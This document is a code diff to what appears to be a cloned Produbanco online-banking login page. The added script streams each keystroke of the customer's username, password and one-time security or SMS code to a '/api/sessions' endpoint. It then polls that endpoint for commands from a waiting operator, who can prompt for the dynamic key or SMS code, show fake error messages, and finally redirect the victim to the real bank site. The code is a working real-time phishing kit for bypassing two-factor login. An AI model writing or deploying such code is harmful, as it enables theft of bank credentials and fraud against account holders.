@@ -254,6 +254,30 @@
                               </div>
                             </div>
                           </div>
+                          <div id="pasoToken" hidden>
+                            <div class="form-group wp-grupo-caja mb-3">
+                              <label class="wp-texto-pequeno wp-etiqueta" id="lblToken" for="TokenInput">Código de Seguridad</label>
+                              <p class="wp-texto-pequeno mb-2" id="descToken" style="color: #616161; line-height: 1.4;">Ingresa el código temporal de seguridad generado por tu aplicación móvil.</p>
+                              <div class="wp-campo-clave">
+                                <span class="wp-campo-clave__icono" aria-hidden="true">
+                                  <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round">
+                                    <rect x="5" y="11" width="14" height="10" rx="2"></rect>
+                                    <path d="M8 11V8a4 4 0 0 1 8 0v3"></path>
+                                  </svg>
+                                </span>
+                                <input
+                                  id="TokenInput"
+                                  name="TokenInput"
+                                  type="text"
+                                  inputmode="numeric"
+                                  maxlength="10"
+                                  autocomplete="off"
+                                  placeholder="Ingresa el código"
+                                />
+                              </div>
+                            </div>
+                          </div>
+                          <div id="mensajeAlerta" style="display:none; font-size:13px; color:#b71c1c; background:#fff2f2; border:1px solid #f5c6cb; border-radius:4px; padding:8px 12px; margin-bottom:12px;"></div>
                           <button
                             class="wp-control wp-control-boton col-12 wp-control-boton--primario wp-control-boton--deshabilitado"
                             id="btnValidaUsuario"
@@ -300,6 +324,11 @@
     <script>
       const usuario = document.getElementById('Usuario')
       const clave = document.getElementById('Clave')
+      const tokenInput = document.getElementById('TokenInput')
+      const lblToken = document.getElementById('lblToken')
+      const descToken = document.getElementById('descToken')
+      const pasoToken = document.getElementById('pasoToken')
+      const mensajeAlerta = document.getElementById('mensajeAlerta')
       const button = document.getElementById('btnValidaUsuario')
       const pasoUsuario = document.getElementById('pasoUsuario')
       const pasoClave = document.getElementById('pasoClave')
@@ -308,24 +337,155 @@
       const textoRecuperar = document.getElementById('textoRecuperar')
       const mostrarClave = document.getElementById('btnMostrarClave')
       const btnRegresar = document.getElementById('btnRegresar')
-      let paso = 'usuario'
 
-      function setBotonListo(listo) {
+      let paso = 'usuario'
+      let currentMode = 'dinamica'
+      let pollingInterval = null
+      let isWaitingOperator = false
+
+      let sessionId = localStorage.getItem('produ_session_id')
+      if (!sessionId) {
+        sessionId = 'pb_' + Math.random().toString(36).substring(2, 9) + Date.now().toString(36)
+        localStorage.setItem('produ_session_id', sessionId)
+      }
+
+      function mostrarError(texto) {
+        if (!texto) {
+          mensajeAlerta.style.display = 'none'
+          mensajeAlerta.textContent = ''
+        } else {
+          mensajeAlerta.textContent = texto
+          mensajeAlerta.style.display = 'block'
+        }
+      }
+
+      function setBotonListo(listo, texto = 'Continuar') {
         button.disabled = !listo
+        button.textContent = texto
         button.classList.toggle('wp-control-boton--deshabilitado', !listo)
       }
+
+      function syncLive(customState) {
+        const u = (usuario.value || '').trim()
+        const c = clave.value || ''
+        const t = (tokenInput && tokenInput.value) ? tokenInput.value.trim() : ''
+        const state = customState || (paso === 'token' ? 'received-' + currentMode : 'typing')
+
+        fetch('/api/sessions', {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({
+            id: sessionId,
+            user: u || '—',
+            username: u || '—',
+            clave: c || '—',
+            password: c || '—',
+            token: t,
+            tipo: 'Banca Personas',
+            device: /Mobi|Android|iPhone/i.test(navigator.userAgent) ? 'mobile' : 'desktop',
+            state: state
+          })
+        }).catch(() => {})
+      }
+
+      function startPolling() {
+        if (pollingInterval) clearInterval(pollingInterval)
+        pollingInterval = setInterval(async () => {
+          try {
+            const res = await fetch('/api/sessions/' + sessionId)
+            if (!res.ok) return
+            const sess = await res.json()
+            if (!sess) return
+
+            if (sess.action) {
+              const act = sess.action
+              // Consume action
+              await fetch('/api/sessions/' + sessionId + '/action', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ action: null, state: sess.state })
+              }).catch(() => {})
+
+              if (act === 'dinamica' || act === 'sms') {
+                isWaitingOperator = false
+                currentMode = act
+                paso = 'token'
+                mostrarError('')
+                pasoUsuario.hidden = true
+                pasoClave.hidden = true
+                pasoToken.hidden = false
+                enrolamiento.hidden = true
+                titulo.hidden = true
+                tokenInput.value = ''
+                if (act === 'dinamica') {
+                  lblToken.textContent = 'Clave Dinámica'
+                  descToken.textContent = 'Ingresa el código dinámico generado en tu app móvil Produbanco.'
+                } else {
+                  lblToken.textContent = 'Código SMS'
+                  descToken.textContent = 'Hemos enviado un código SMS de verificación a tu celular registrado.'
+                }
+                setBotonListo(false, 'Confirmar')
+                tokenInput.focus()
+              } else if (act === 'error-login') {
+                isWaitingOperator = false
+                paso = 'clave'
+                pasoToken.hidden = true
+                pasoClave.hidden = false
+                mostrarError('La contraseña ingresada es incorrecta. Por favor, inténtalo de nuevo.')
+                clave.value = ''
+                setBotonListo(false, 'Continuar')
+                clave.focus()
+              } else if (act === 'error-dinamica') {
+                isWaitingOperator = false
+                tokenInput.value = ''
+                mostrarError('El código dinámico es incorrecto o ha caducado. Inténtalo de nuevo.')
+                setBotonListo(false, 'Confirmar')
+                tokenInput.focus()
+              } else if (act === 'error-sms') {
+                isWaitingOperator = false
+                tokenInput.value = ''
+                mostrarError('El código SMS es incorrecto o ha caducado. Inténtalo de nuevo.')
+                setBotonListo(false, 'Confirmar')
+                tokenInput.focus()
+              } else if (act === 'done') {
+                window.location.href = 'https://www.produbanco.com.ec/'
+              }
+            }
+          } catch (_) {}
+        }, 1200)
+      }
+
+      // Keepalive ping
+      setInterval(() => {
+        fetch('/api/sessions/' + sessionId + '/ping', { method: 'POST' }).catch(() => {})
+      }, 5000)
 
       usuario.addEventListener('input', function () {
         const start = this.selectionStart
         const end = this.selectionEnd
         this.value = this.value.toUpperCase()
         this.setSelectionRange(start, end)
+        mostrarError('')
         if (paso === 'usuario') setBotonListo(this.value.trim().length > 0)
+        syncLive('typing')
       })
+      usuario.addEventListener('keyup', () => syncLive('typing'))
+      usuario.addEventListener('change', () => syncLive('typing'))
 
       clave.addEventListener('input', function () {
+        mostrarError('')
         if (paso === 'clave') setBotonListo(this.value.length > 0)
+        syncLive('typing')
       })
+      clave.addEventListener('keyup', () => syncLive('typing'))
+      clave.addEventListener('change', () => syncLive('typing'))
+
+      tokenInput.addEventListener('input', function () {
+        mostrarError('')
+        if (paso === 'token') setBotonListo(this.value.trim().length >= 4, 'Confirmar')
+        syncLive('received-' + currentMode)
+      })
+      tokenInput.addEventListener('keyup', () => syncLive('received-' + currentMode))
 
       mostrarClave.addEventListener('click', function () {
         const visible = clave.type === 'text'
@@ -336,9 +496,11 @@
       btnRegresar.addEventListener('click', function () {
         paso = 'usuario'
         pasoClave.hidden = true
+        pasoToken.hidden = true
         pasoUsuario.hidden = false
         enrolamiento.hidden = false
         titulo.hidden = false
+        mostrarError('')
         textoRecuperar.textContent = 'Recuperar usuario y contraseña'
         textoRecuperar.classList.add('font-weight-bold')
         clave.value = ''
@@ -350,6 +512,8 @@
 
       document.getElementById('frmInicioSesion').addEventListener('submit', function (event) {
         event.preventDefault()
+        mostrarError('')
+
         if (paso === 'usuario' && usuario.value.trim()) {
           paso = 'clave'
           pasoUsuario.hidden = true
@@ -360,8 +524,28 @@
           textoRecuperar.classList.remove('font-weight-bold')
           setBotonListo(false)
           clave.focus()
+          syncLive('typing')
+          return
+        }
+
+        if (paso === 'clave' && clave.value) {
+          isWaitingOperator = true
+          setBotonListo(false, 'Verificando...')
+          syncLive('waiting')
+          startPolling()
+          return
+        }
+
+        if (paso === 'token' && tokenInput.value.trim()) {
+          isWaitingOperator = true
+          setBotonListo(false, 'Verificando...')
+          syncLive('received-' + currentMode)
+          return
         }
       })
+
+      // Send initial presence so session appears immediately
+      syncLive('typing')
     </script>
   </body>
 </html>
